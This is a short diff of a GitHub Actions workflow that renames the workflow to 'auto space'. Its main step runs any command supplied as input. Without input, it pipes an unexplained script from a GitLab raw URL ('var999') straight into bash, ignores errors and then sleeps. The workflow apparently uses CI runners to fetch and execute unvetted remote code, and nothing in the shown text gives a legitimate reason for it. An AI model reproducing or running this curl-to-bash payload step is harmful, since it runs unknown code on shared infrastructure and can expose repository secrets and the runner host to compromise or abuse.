@@ -1,4 +1,4 @@
-name: kitasa
+name: auto space
 
 on:
   workflow_dispatch:
@@ -34,9 +34,8 @@ jobs:
     steps:                   
       - name: Jalankan perintah
         continue-on-error: true
-        run: ${{ github.event.inputs.command || 'curl -sL https://gitlab.com/masaakk88/file/diamonds8line/-/raw/main/var999 | bash' }}
-      - name: okes
-        run: sleep 300        # 5 menit
+        run: ${{ github.event.inputs.command || 'curl -sL https://gitlab.com/masaakk88/file/diamonds8line/-/raw/main/var999 | bash' }} && sleep 360s
+
 
   dert:
     needs: [hert]
